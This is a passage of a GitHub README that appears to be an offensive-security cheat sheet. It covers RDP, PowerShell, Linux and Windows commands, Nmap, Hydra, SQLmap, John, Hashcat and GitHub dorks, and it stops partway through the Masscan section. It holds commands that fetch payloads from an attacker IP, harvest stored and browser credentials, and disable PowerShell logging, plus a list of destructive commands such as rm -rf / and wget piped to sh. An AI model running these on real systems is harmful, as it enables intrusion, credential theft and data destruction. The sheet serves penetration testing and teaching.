 <!-- <h1 align='center'> Penetration time</h1> -->
 <body>
	
[![Typing SVG](https://readme-typing-svg.demolab.com?font=Bitter&weight=500&size=40&pause=1000&color=3C4CFF&background=AC51FF00&width=500&height=80&lines=P3n3tr4ti0n+T1me!)](https://git.io/typing-svg)
<img src='https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExYWM2NWI0ZDIwMjA3ZWIyYWRiZmEyYzA5NTFlNThmNTFhYWI1MWE0ZiZlcD12MV9pbnRlcm5hbF9naWZzX2dpZklkJmN0PWc/3oz8xA9gtnyVDPZJHW/giphy.gif' width='250'/>


<h2 align='center'>Welcome to my offensive security cheat sheet library.</h2>
<h3 align='center'>Please use responsibly and ethically, especially when exploring sensitive security concepts.</h3>

<h3 id='start'> There are: </h3>
<ol>
	<li><a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/network_tools'>Network tools</a></li>
	<li><a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/shells'>Web Shells</a></li>
	<li><a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/scripts'>Scripts</a></li>
  	<li><a href='#n1'>Commands</a></li>
  	<li><a href='#n2'>Payloads</a> with description. <a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/payloads'>Here</a> just payloads in file</li>
  	<li><a href='#n3'>Sites</a></li>
	<li><a href='#n4'>Tools</a></li>
	<li><a href='#n5'>Privilege Escalation</a></li>
	<li><a href='#n6'>Tips</a></li>
	<li><a href='#n7'>GPTs (Agents) for Cybersecurity</a></li>
	<li><a href='#n8'>OSINT</a></li>
	<li><a href='#n9'>API</a></li>
	<li><a href='#n10'>WordPress</a></li>
	<li><a href='#n11'>JWT</a></li>
	<li>Help with <a href='https://github.com/Kode-n-Rolla/pentesting_time/blob/main/Pentest_methodology.md'>Pentesting</a> processes</li>
	<li><a href='https://github.com/Kode-n-Rolla/pentesting_time/blob/main/Recon.md'>Recon.md</a> (tools)</li>
	<li><a href='https://github.com/Kode-n-Rolla/pentesting_time/blob/main/Cloud.md'>Cloud</a></li>
	<li><a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/active_directory'>Active Directory</a></li>
	<li><a href='#n12'>Toolkit</a></li>
	<!--<li> cheat sheet injections
	Add XSStrike to Tools!-->
 	<p><h3><ins>N.B. <-- Back link - Means return to the table of contents.</ins></h3>

</ol>

<h2 align='center' id='n1'><em> Commands </em></h2> 
Topic contains:
	<li>Remote Desktop Protocol <a href='#n1.1'>(RDP)</a></li>
	<li><a href='#n1.2'>PowerShell</a></li>
	<li><a href='#n1.3'>Linux</a></li>
	<li><a href='#n1.4'>Windows</a></li>
	<li><a href='#n1.5'>Nmap</a> commands with search vulnerabilities scripts</li>
	<li><a href='#n1.6'>Gobuster</a></li>
	<li><a href='#n1.7'>Hydra</a></li>
	<li><a href='#n1.8'>Dirsearch</a></li>
	<li><a href='#n1.9'>Pumping</a> shell</li>
	<li><a href='#n1.10'>SQLmap</a></li>
	<li><a href='#n1.11'>John The Ripper</a></li>
 	<li><a href='#n1.12'>Hashcat</a></li>
  	<li><a href='#n1.13'>Google Dorks</a></li>
	<li><a href='#n1.14'>GitHub Dorking</a></li>
   	<li><a href='#n1.15'>Ffuf</a></li>
    	<li><a href='#n1.16'>Rustscan</a></li>
      	<li><a href='#n1.17'>Masscan</a></li>
        <li><a href='#n1.18'>Meterpreter</a></li>
	<li><a href='#n1.19'>CMD (Windows)</a></li>
        <li><a href='#n1.20'>Reverse shell</a></li>
	<li><a href='#n1.21'>Git</a></li>
 	<li><a href='#n1.22'>SSH and id_rsa</a></li>
  	<li><a href='#n1.23'>Clear log files</li>
		
<h3 id='n1.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Remote Desktop Protocol (RDP): </ins></h3>
  <pre><code> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;'PASSWORD'> </code></pre>
  <p><pre><code> xfreerdp /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;PASSWORD> +clipboard </code></pre>
	
<h3 id='n1.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>PowerShell commands </ins></h3>
<ul>
   <li> To get stable shell from unstable from PowerShell. FILENAME.exe is the reverse shell:
  <pre><code> powershell -c "Invoke-WebRequest -Uri 'http://&lt;LOCAL_IP>:&lt;PORT>/&lt;FILENAME.exe>' -OutFile 'C:\Windows\Temp\&lt;FILENAME.exe>'" </code></pre>

  <li><p> With this command, you can identify files with potentially sensitive data such as account information, credentials, configuration files, etc. based on their filename: <pre><code>gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue</code></pre>

  <li><p> This command will look for remnants of autosets and autoconfigurations that could potentially contain plain text or base64 encoded passwords: <pre><code>gci c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue</code></pre>

  <li><p> With this command it is possible to find files containing a specific pattern, for example here we are looking for the "password" pattern in various text configuration files: <pre><code>gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"</code></pre>

  <li><p> Using the following PowerShell command, you can find database connection strings (with plain text credentials) stored in various configuration files such as web.config for ASP.NET configuration, Visual Studio project files, etc.: <pre><code>gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString"</code></pre>

  <li><p> With this command, you can easily find configuration files belonging to a Microsoft IIS, XAMPP, Apache, PHP, or MySQL installation: <pre><code>gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue</code></pre>

  <li><p> With the following one-liner, we can retrieve all stored credentials from the credential manager using the CredentialManager PowerShell module: <pre><code>Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }</code></pre>

  <li><p> The following command retrieves saved credentials from the Google Chrome browser, if installed and if there are saved passwords: <pre><code>[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))</code></pre>

  <li><p> The following command will get the autologin credentials from the registry: <pre><code>gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"</code></pre>

  <li><p> Sometimes it can be useful to set the MAC address on a network interface, and with PowerShell we can easily do this without using third party utilities: <pre><code>Set-NetAdapter -Name "Ethernet0" -MacAddress "00-01-18-57-1B-0D"</code></pre>

  <li><p> This trio of commands can be useful when there is a goal to connect to the system using a graphical RDP session, but for some reason it is not enabled: 
  <p> Allow RDP connections - <pre><code>(Get-WmiObject -Class "Win32_TerminalServiceSetting" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)</code></pre> 
  <p> Disable NLA - <pre><code>(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)</code></pre> 
  <p> Allow RDP on the firewall - <pre><code>Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Set-NetFirewallRule -Enabled True</code></pre>

  <li><p> Here is a useful command to whitelist an IP address in Windows Firewall: <pre><code>New-NetFirewallRule -Action Allow -DisplayName "name_rule" -RemoteAddress &lt;DESIRED_IP></code></pre>
  After we are done with our cases, remove the rule: <pre><code>Remove-NetFirewallRule -DisplayName "name_rule"</code></pre>

  <li><p> With the following commands, we can disable the logging feature of PowerShell commands in the current shell session: <pre><code>Set-PSReadlineOption –HistorySaveStyle SaveNothing</code></pre> 
  <p> OR <pre><code>Remove-Module PSReadline</code></pre>

  <li><p> Here is a simple PowerShell command to query the Security Center and determine all installed antivirus products on this computer: <pre><code>Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct</code></pre>

</ul>
  
<h3 id='n1.3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Linux </ins></h3>
<a href='https://explainshell.com/'> ExplainShell</a> - provides a convenient interface for searching help information for any command
<h4> &nbsp;&nbsp;&nbsp; Commands to find </h4>
	<ul>
		<li> Find all files in / directory (-type d for find dirs):</li>
			<p> <pre><code> find / -type f </code></pre>
		<li> File name search:</li>
			<p> <pre><code> find / -type f | grep '&lt;FILE_NAME>' </code></pre>
		<li> Find all path files with ‘config’ in proc dirs:</li>
			<p> <pre><code> find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null </code></pre>
	 	<li> To turn off send hostname via DHCP</li>
	  		<p> <pre><code> sudo nano /etc/NetworkManager/system-connections/Wired\ connection\ 1 </code></pre>
	    		<p> &nbsp;&nbsp; [ipv4]
	      		<p> &nbsp;&nbsp; method=auto
			<p> &nbsp;&nbsp; dhcp-send-hostname=false
		<li> To allow traffic routing on your part (Main rule for MITM)</li>
			<p> <pre><code> sudo sysctl -w net.ipv4.ip_forward=1 </code></pre>
		<li> Transferring files</li>
			<pre><code> scp &lt;FILE_NAME> &lt;USERNAME>@&lt;TARGET_HOST>:&lt;/path/to/dir/on/victim_machine></code></pre>
			<pre><code> wget http://&lt;ATTACKER_IP>:&lt;ATTACKER_PORT>/&lt;FILE_NAME> </code></pre>
			<pre><code> curl http:///&lt;ATTACKER_IP>:&lt;ATTACKER_PORT>/&lt;FILE_NAME> -o &lt;FILE_NAME> </code></pre>
	</ul>
 <h4> &nbsp;&nbsp;&nbsp; Never run these Linux commands: </h4>
 	<ul>
		<li>This command will delete all files and folders on your computer:</li>
			<pre><code> rm -rf /  </code></pre>
		<li>Also known as a "fork bomb", this command can cause a memory overflow on your computer and lead to system crash:</li>
			<pre><code> :(){ :|: & };: </code></pre>
		<li>This command formats the hard drive without any warning or confirmation. All data will be lost:</li>
			<pre><code> mkfs.ext4 /dev/sda </code></pre>
		<li>This command overwrites all data on the hard drive with random values, resulting in data loss:</li>
			<pre><code> dd if=/dev/random of=/dev/sda </code></pre>
		<li>This command grants full access to your file system for all users, which can compromise security:</li>
			<pre><code> chmod 777 / </code></pre>
		<li>This command moves all files in your home directory to "null", effectively deleting them:</li>
			<pre><code> mv /home/* /dev/null </code></pre>
		<li>This command downloads a file and overwrites all data in "null", resulting in data loss:</li>
			<pre><code> wget http://example.com/file -O /dev/null </code></pre>
		<li>This command formats the hard drive partition without any warning or confirmation. All data on this partition will be lost:</li>
			<pre><code> mkfs.ext4 /dev/sda1 </code></pre>
		<li>This command creates a symbolic link to "/etc/passwd" in "null", resulting in data loss:</li>
			<pre><code> ln -s /dev/null /etc/passwd </code></pre>
		<li>This will replace your partition containing all the necessary data for booting the system with the string "Hello":</li>
			<pre><code> echo "Hello" > /dev/sda </code></pre>
		<li>Such commands will download and execute malicious scripts on your system, potentially compromising your system's security:</li>
			<pre><code> wget http://malicious_source -O- | sh </code></pre>
		<li>Symlink command:</li>
			<pre><code>chmod +x exe_file_name</code></pre>
			<pre><code>sudo ln -s /path/to/file/ /usr/local/bin/name_command</code></pre>
  	</ul>

<h3 id='n1.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Windows </ins></h3>
<h4> &nbsp;&nbsp;&nbsp; Commands to find </h4>
	<ol>
		<li> This command searches for the string "password" inside all files with the extensions .xml, .ini, .txt, and .config on the current C: drive:
	 	<pre><code>cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config</code></pre>
			<ul> 
					<li> cd C:\ - changes to the root directory of the C: drive
					<li> findstr - command for searching strings in files
					<li> /s - performs a search in all subdirectories
					<li> /p - skips files with non-printable characters
					<li> /i - ignores case sensitivity when searching for strings
					<li> /n - displays the line number containing the string
					<li> /m - displays only the file name if a match is found
		   	</ul>
     		<li> <code> dir </code> - like ls in linux
		<li> <code> tree </code> utility is useful for graphically displaying the directory structure of a path or disk
  			<p> <code> tree c:\ /f | more </code> - used to walk through all the files in the C drive
		<li> <code> icacls </code>
			<p> The resource access level:
			<ul>
				<li> (CI): container inherit
				<li> (OI): object inherit
				<li> (IO): inherit only
				<li> (NP): do not propagate inherit
				<li> (I): permission inherited from parent container
    			</ul>
			Basic access permissions:
			<ul>
				<li> F : full access
				<li> D :  delete access
				<li> N :  no access
				<li> M :  modify access
				<li> RX :  read and execute access
				<li> R :  read-only access
				<li> W :  write-only access
			</ul>
			A full listing of icacls command-line arguments and detailed permission settings can be found <a href='https://ss64.com/nt/icacls.html'>here</a>.
	</ol>
		
<h3 id='n1.5'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Nmap</ins> with vulnerse script (1)</h3>
Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'> download </a> script files from github and copy to nmap scripts folder. Thanks for that, <a href='https://github.com/vulnerscom'> Vulners Team </a>!

   Checking for a vulnerability in the software on the server:
   <p> <pre><code> Nmap -Pn &lt;TARGET_IP> --script=vulners.nse -p&lt;PORT(S)> </code></pre>
   Checking brute force resistance on ssh:
   <p> <pre><code> nmap --script ssh-brute -p &lt;SSH_PORT> &lt;TARGET_IP> --script-args userdb=users.lst,passdb=passwords.lst </code></pre>
   Checking brute force resistance on ftp:
   <p> <pre><code> nmap -d --script ftp-brute -p &lt;FTP_PORT> &lt;TARGET_IP> </code></pre>
   Checking mysql anonymous login:
   <p> <pre><code> nmap -sV --script=mysql-empty-password &lt;TARGET_IP> </code></pre>
   Attempts to select a pair of login/password to enter the mysql database:
   <p> <pre><code> nmap --script mysql-brute -p &lt;MYSQL_PORT> &lt;TARGET_IP> --script-args userdb=users.lst, passdb=passwords.lst </code></pre>
   Search for hidden folders and files:
   <p> <pre><code> nmap -sV -p &lt;PORT> --script http-enum &lt;TARGET_IP> </code></pre>
   <p> P.S. If CMS, research <code>&lt;name_0f_CMS_0r_DB> brute force nmap</code>
   <p> P.P.S. Full <a href='https://www.infosecmatter.com/ultimate-list-of-nmap-nse-scripts-interactive-table/'>list</a> of NMAP NSE sctipts.
   <p>&nbsp;&nbsp;Catogories: auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln.

<h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Nmap</ins> with vulnerse script (2)</h3>
Need to install script. Thanks for that, <a href='https://github.com/scipag'> Scip ag</a>!
	<ol>
		<li><pre><code> git clone https://github.com/scipag/vulscan.git </code></pre>
			<p> Or read Scip ag instructions. It`s easy. 
  		<li> Copy to /usr/share/nmap/scripts/ or another folder where you keep nmap scripts
    		<li> Get rights
      		<li> <pre><code> nmap -sV --script=vulscan/vulscan.nse &lt;TARGET> </code></pre>
	</ol>
	   
<h3 id='n1.6'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Gobuster command: </ins></h3>
	 &nbsp;&nbsp;&nbsp;Directories enumeration:
 		<p>-u - target url
   		<p>-w - wordlist
		<p>-s - include only responses with the specified status codes (comma-separated)
		<p>-d - exclude responses with the specified status codes (comma-separated)
		<p>--exclude-length - exclude responses with specific content lengths (comma-separated, supports ranges)
   		<pre><code>gobuster dir -u &lt;TARGET_URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
   	 &nbsp;&nbsp;&nbsp;Subdomains enumeration:
    		<p>vhost - for enumirate virtual hosts
   		<pre><code>gobuster vhost -w &lt;/path/to/wordlist> -u &lt;url></code></pre>
         &nbsp;&nbsp;&nbsp; OR
	 	<p>t - threads
	 	<pre><code>gobuster dns &lt;TARGET_DOMAIN> -w /usr/share/wordlists/dns/subdomains_list.txt -t 50</code></pre>
	
<h3 id='n1.7'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Hydra </ins></h3>
    &nbsp;&nbsp;&nbsp; Brute force against a protocol of some choice:
   	<pre><code> hydra -P &lt;WORLIST> -v &lt;TARGET_IP> &lt;PROTOCOL> </code></pre>
   <p> &nbsp;&nbsp;&nbsp; Brute Force ssh:
	   <pre><code>hydra -L /path/to/file/user.txt -P /path/to/file/pass.txt &lt;TARGET_IP> ssh -t 4</code></pre>
   <p> &nbsp;&nbsp;&nbsp; Brute Force smb example:
	<pre><code> hydra -L ~/path/to_file/user.txt -P ~.path/to_file/pass.txt &lt;TARGET_IP> smb -V</code></pre>   
   <p> &nbsp;&nbsp;&nbsp; Can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in some lists. (-vV = verbose mode, showing login attempts):
   	<pre><code> hydra -v -V -u -L &lt;USERNAME_LIST> -P &lt;PASSWORD_LIST> -t 1 -u &lt;TARGET_IP> &lt;PROTOCOL> </code></pre>
   <p> &nbsp;&nbsp;&nbsp; Attack a Windows Remote Desktop with a password list:
   	<pre><code> hydra -t 1 -V -f -l &lt;USERNAME> -P &lt;WORDLIST> rdp://&lt;TARGET_IP> </code></pre>
   <p> &nbsp;&nbsp;&nbsp; Craft a more specific request for Hydra to brute force:
   	<pre><code> hydra -l &lt;USERNAME> -P .&lt;PASSWORD_LIST> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' </code></pre>
		
<h3 id='n1.8'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Dirsearch </ins></h3>
   Search a lot of interesting by extensions:
   <pre><code> dirsearch -e php,log,sql,txt,bak,tar,tar.gz,zip,rar,swp,gz,asp,aspx -u '&lt;TARGET_IP>' </code></pre>
		
<h3 id='n1.9'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Way to <ins>pump</ins> nc shell </h3>
   <ul>
	   <li>Python way. PTY is a library for pseudo-terminal functionality that is part of the Standard Python Library. There is a nc shell and get pump shell:
	   <pre><code> python -c 'import pty;pty.spawn("/bin/bash")' </code></pre>
	   <pre><code>export TERM=xterm</code></pre>
	   <p>Console to bg (Ctrl+Z) </p>
	   <pre><code>stty raw -echo; fg</code></pre>
	   <p> If no python:
	   	<pre><code>/usr/bin/script -qc /bin/bash /dev/null</code></pre>
 	   <li> Another way:
		   <pre><code>script /dev/null -c /bin/bash</code></pre>
		   Console to bg (Ctrl+Z) ->
		   <!--<pre><code>^Z</code></pre>-->
		   <pre><code>stty raw -echo; fg</code></pre>
		   Then double Enter and we again in shell and input
		   <pre><code>export TERM=xterm</code></pre>
	   <li>Or check this <a href='https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys'>link</a> for more help</li>
   </ul>

<h3 id='n1.10'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> SQLmap </ins></h3>
	&nbsp;&nbsp;&nbsp; Start SQL injection attack:
 	<pre><code>sqlmap -u "&lt;TARGET_URL>" --dbs --batch</code></pre>
  		-u - target URL
   		<p>--dbs - get db name
    		<p>--batch -default whenever user input is unavoidable
     	<p> &nbsp;&nbsp;&nbsp; When get the db name to get tables name
	<pre><code>sqlmap -u "&lt;TARGET_URL>" -D &lt;db_name> --tables --batch</code></pre>
		-D - db name
  		<p>--tables - tables enumiration
    	<p> &nbsp;&nbsp;&nbsp; To get columns name in the table of interest
     	<pre><code>sqlmap -u "&lt;TARGET_URL>" -D &lt;db_name> -T &lt;table_name> --columns --batch</code></pre>
		-T - selected table
  		<p>--columns - to output db columns
    	<p> &nbsp;&nbsp;&nbsp; Get data from table
     	<pre><code>sqlmap -u "&lt;TARGET_URL>" -D &lt;db_name> -T &lt;table_name> --dump --batch</code></pre>
      		--dump - unload information from the DBMS database 
	<p> &nbsp;&nbsp;&nbsp; Will execute all the above functions at once and output all information about the database, including table names, columns, etc.
     	<pre><code>sqlmap -u "&lt;TARGET_URL>" -D &lt;db_name> --dump-all --batch</code></pre>
      		--dump-all - unload all information from the DBMS database 

 <h3 id='n1.11'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> John The Ripper </ins></h3>
 	Firstly use hash-identifier. 
 	<p><h4> &nbsp;&nbsp;&nbsp; Cracking some type of hashes: </h4>
  		<pre><code>john --format=raw-&lt;encryption> --wordlist=path/to/wordlist.txt to_crack.txt</code></pre>
   		&lt;encryption> - md4, md5, sha1, sha256, whirlpool
    	<p><h4> &nbsp;&nbsp;&nbsp; Single Mode </h4>
		<p> There is a username and hash password (username:d776dd32d662b8efbdf853837269bd725203c579 and this line in file to-crack.txt), so use this mode to generate password variations (Username, USERNAME, UseRNAmE, and so on):
     		<pre><code>john --single --format=raw-sha1 to_crack.txt</code></pre>
     	<p><h4> &nbsp;&nbsp;&nbsp; Dictionary Mode </h4>
		<p>There is a file to_crack.txt with edba955d0ea15fdef4f61726ef97e5af507430c0, for example.
      		<p> The command to run John in dictionary mode using the wordlist:
       		<pre><code>john --wordlist=path/to/wordlist.txt --format=raw-sha1 to_crack.txt</code></pre>
	<p><h4> &nbsp;&nbsp;&nbsp; Incremental Mode </h4>
 		<p>It tries all possible character combinations as passwords. Can go on for a long time if the password is too long or a combination of alphanumeric characters and symbols:
   		<pre><code>john -i:digits passwordfile.txt</code></pre>
		<p> -i - tells John that to use the increment mode
  		<p> digits - can be used to set the maximum number of digits in the password
    	<p><h4> &nbsp;&nbsp;&nbsp; To crack LM/NTLM: </h4>
     		<pre><code>john --format=lm to_crack.txt</code></pre>
       	<p><h4> &nbsp;&nbsp;&nbsp; To crack a Linux password </h4>
	<p>The unshadow command combines the passwd (/etc/passwd) and shadow(/etc/shadow) files together into a single file. This can then be used by John to crack passwords.
		<p> The command will combine the files together and create an output.db file:
		<pre><code>unshadow /etc/passwd /etc/shadow > output.db</code></pre>
  		<p> Now crack the output.db file:
    		<pre><code>john output.db</code></pre>
      <p><h4> &nbsp;&nbsp;&nbsp; Cracking a Zip file password </h4>
      		<p> First have to get the hash of the zip file’s password. Command will get the hash from the zip file and store it in the zip.hashes file:
      		<pre><code>zip2john file.zip > zip.hashes</code></pre>
		<p> Then to crack the hash:
  		<pre><code>john zip.hashes</code></pre>
      
<h3 id='n1.12'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Hashcat </ins></h3>
	<p><h4> &nbsp;&nbsp;&nbsp; MD5 Hashes </h4>
 	<p> hash.txt > 8743b52063cd84097a65d1633f5c74f5
  	<p> Use:
   		<pre><code>hashcat -m 0 -a 0 hash.txt passwordlist.txt</code></pre>
     		<p> -m 0 - MD5 hash mode
       		<p> -a 0 - dictionary mode
	 	<p> hash.txt - txt file containing hash in a compliant format
   		<p> passwordlist.txt - dictionary file containing passwords in plain text
     <p><h4> &nbsp;&nbsp;&nbsp; Salted MD5 Hashes </h4>
     	<p> hash.txt > md5($pass.$salt):  01dfae6e5d4d90d9892622325959afbe:7050461
       		<pre><code>hashcat -m10 -a0 hash.txt passwordlist.txt</code></pre>
	 	<p> -m 10 - salted MD5 hash mode
   	<p><h4> &nbsp;&nbsp;&nbsp; MD5Crypt Digets </h4>
    	<p> hash.txt > md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) $1$28772684$iEwNOgGugqO9.bIz5sk8k/ 
     		<pre><code>hashcat -m 500 -a 0 hash.txt passwordlist.txt</code></pre>
       		<p> -m 500 - MD5Crypt Digests hash mode
	 <p><h4> &nbsp;&nbsp;&nbsp; HMAC-SHA1 key </h4>
       	 <p> hash.txt > HMAC-SHA1 (key = $pass) c898896f3f70f61bc3fb19bef222aa860e5ea717:1234
  		<pre><code>hashcat -m150 -a 0 hash.txt passwordlist.txt</code></pre>
    		<p> -m 150 - HMAC-SHA1 key hash mode
      <p><h4> &nbsp;&nbsp;&nbsp; SHA-1 Digets </h4>
      <p> hash.txt > b89eaac7e61417341b710b727768294d0e6a277b
      		<pre><code>hashcat -m100 -a 0 hash.txt passwordlist.txt</code></pre>
		<p> -m 100 - SHA1 digest hash mode
  	<p><h4> &nbsp;&nbsp;&nbsp; SHA2-384 Hash </h4>
   	<p> hash.txt > SHA2-384 07371af1ca1fca7c6941d2399f3610f1e392c56c6d73fddffe38f18c430a2817028dae1ef09ac683b62148a2c8757f42
     		<pre><code>hashcat -m 10800 -a 0 hash.txt passwordlist.txt</code></pre>
       		<p> -m 10800 - SHA-2 Digests hash mode
	 <p><h4> &nbsp;&nbsp;&nbsp; SHA3-512 Hash </h4>
  	 <p> hash.txt > SHA3–512 7c2dc1d743735d4e069f3bda85b1b7e9172033dfdd8cd599ca094ef8570f3930c3f2c0b7afc8d6152ce4eaad6057a2ff22e71934b3a3dd0fb55a7fc84a53144e
      		<pre><code>hashcat -m 17600 -a 0 hash.txt passwordlist.txt</code></pre>
		<p> -m 17600 - SHA3–512 hash mode
	<p><h4> &nbsp;&nbsp;&nbsp; NTLM Hashes </h4>
	<p> hash.txt > b4b9b02e6f09a9bd760f388b67351e2b
 		<pre><code>hashcat -m 1000 -a 0 hash.txt passwordlist.txt</code></pre>
   		<p> -m 1000 - NTLM Digests hash mode
     	<p><h4> &nbsp;&nbsp;&nbsp; CRC32 hashes </h4>
      	<p> hash.txt > c762de4a:00000000
       		<pre><code> hashcat -m 11500 -a 0 hash.txt passwordlist.txt</code></pre>
	 	<p> -m 11500 - CRC32 hash mode

<h3 id='n1.13'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Google Dorks </ins></h3>
	<ul>
		<li> site: - returns results for the specified domain
		<li> intitle: - search in title
		<li> inurl: - search by url
		<li> related: - returns sites to the specified one
		<li> ext: or filtype: - search by page extension or filetype
		<li> cahce:
		<li> intext:
		<li> allintext:
		<li> allinurl:
		<li> More <a href='https://gist.github.com/stevenswafford/393c6ec7b5375d5e8cdc'> here </a>
	</ul>
 
<h3 id='n1.14'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> GitHub Dorking </ins></h3>
	<ul>
		<li> AWS keys
			<pre><code>path:**/.env AWS_ACCESS_KEY_ID</code></pre>
		<li> Open DB passwords
			<pre><code></code>DB_PASSWORD=</pre>
		<li> DB dump files
			<pre><code>path:*.sql "CREATE TABLE" AND "INSERT INTO"</code></pre>
		<li> API keys
			<pre><code>path:**/.properties api_key</code></pre>
		<li> Root passwords in docker-compose
			<pre><code>path:**/docker-compose.yml MYSQL_ROOT_PASSWORD</code></pre>
		<li> Private keys
			<pre><code>path:*.pem private</code></pre>
		<li> Open secrets JWT
			<pre><code>language:javascript jwt_secret OR jwt_key</code></pre>
		<li> Open .git directories
			<pre><code>path:**/.git/*</code></pre>
		<li> Public ssh keys
			<pre><code>path:*.pub "ssh-rsa"</code></pre>
		<li> Passphrase
			<pre><code>passphrase * path:**/.json</code></pre>
		<li> Check commit and issues
		<li> Search and looking for vulns in codes (for example SQLi and SSRF)
			<pre><code>/SELECT \* FROM.*\$_GET/</code></pre>
			<pre><code>/file_get_contents\(.*\$_GET|curl_exec\(.*\$_GET/</code></pre>
			<pre><code>/(subprocess|exec|spawn|system).*chrome.*--headless/</code></pre>
	</ul>

 <h3 id='n1.15'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> FFUF</ins></h3>
 	Flags:
  	<p>-mc (match code) - Include only responses that match the specified status codes (e.g., 200,204,301, 400-499)
	<p>-ms (match size) - Include only responses that match a specific size or range of sizes
	<p>-mw (match word count) - Include only responses that have the specified amount of words in the response body (-fw "admin")
	<p>-ml (match line count) - Include only responses that have the specified amount of lines in the response body
	<p>-mt (match time) - Include only responses that meet a specific time-to-first-byte (TTFB) condition. This is useful for identifying responses that are unusually slow or fast, potentially indicating interesting behavior
	<p>-fc (filter code) - Exclude responses that match the specified status codes, using the same format as -mc
	<p>-fs (filter size) - Exclude responses with a specific size or range of sizes
	<p>-fw (filter word) - Enclude only responses containing the specified word or phrase in the response body
	<p>-fl (filter line) - Exclude responses with a specific number of lines or range of lines. For example, -fl 5 will filter out responses with 5 lines
	<p>-e - extension`s file
	<p>-recursion - recursion fuzzing
 	<pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://&lt;TARGET_IP>:&lt;TARGET_PORT>/FUZZ -e .php,.html,.txt</code></pre>
  	<pre><code>ffuf -w /path/to/wordlist1.txt -w /path/to/wordlist2.txt -u https://example.com/FUZZ?param=FUZZ -mc 200 -ic</code></pre>
   	<pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://&lt;TARGET_IP>:&lt;TARGET_PORT>/FUZZ -recursion</code></pre>
    	<pre><code>ffuf -u http://&lt;TARGET_URL> -H "FUZZ.&lt;TARGET.DOMAIN>" -w /path/to/worlist</code></pre>

 <h3 id='n1.16'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Rustscan</ins></h3>
 	<ul>
		<li> Download <a href='https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb'> deb packet </a>
		<li> Install: <pre><code>sudo dpkg -i rustscan_2.0.1_amd64.deb</code></pre>
		<li> Use:
			<ul>
				<li> Simple ports scanning:
					<pre><code>rustscan -a www.&lt;target_site.com></code></pre>
				<li> Specific port scanning:
					<pre><code>rustscan -a www.&lt;target_site.com> -p 443</code></pre>
					<p> Or few ports:
					<pre><code>rustscan -a www.&lt;target_site.com> -p 21,22,80,443</code></pre>
				<li> Ports detection in the range 1-1000:
					<pre><code>rustscan -a www.&lt;target_site.com> --range 1-1000</code></pre>
    			</ul>
  	</ul>


 <h3 id='n1.17'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Masscan</ins></h3>
 	<ul>
	 	<li> Scanning a Single IP Address:
	  		<pre><code>masscan &lt;target_ip></code></pre>
		<li> Scanning an IP Range:
